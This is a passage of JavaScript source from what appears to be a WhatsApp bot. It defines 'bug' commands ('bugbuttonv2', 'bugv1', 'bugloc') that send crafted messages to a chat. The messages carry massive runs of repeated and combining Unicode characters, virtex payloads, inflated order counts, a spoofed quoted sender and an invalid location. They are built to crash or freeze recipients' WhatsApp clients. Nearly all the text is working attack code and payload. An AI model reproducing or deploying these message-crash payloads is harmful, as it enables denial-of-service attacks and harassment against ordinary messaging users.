ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ𝟗𝟗𝟗`,
								},
								"type": "RESPONSE"								
							}
						],
						"headerType": "EMPTY"
					}
}, {quoted:{
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: 'bugbuttonv2〽', //
                sellerJid: '0@s.whatsapp.net'
                }}}})
Hanz.relayWAMessage(res)
break
case 'bugv1':
var tolol = Hanz.prepareMessageFromContent(from,{
 "orderMessage": {
 "orderId": "599519108102353",
 "thumbnail": virgam,
 "itemCount": 482007,
 "status": "INQUIRY",
 "surface": "CATALOG",
 "message": `${virtex7(prefix)}`,
 "orderTitle": fake,
 "sellerJid": "6283131458282@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
 "totalAmount1000": "Rp 99.99999999999999999999",
 "totalCurrencyCode": "IDR",
 }
 }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }, contextInfo:{}}) 
 Hanz.relayWAMessage(tolol)
break
case 'bugloc':            
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
            res = await Hanz.prepareMessageFromContent(from,{
				"liveLocationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -7493855112275230,
						"caption": `${virtex2(prefix)}-${virtex7(prefix)}-️${virtex3(prefix)}🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤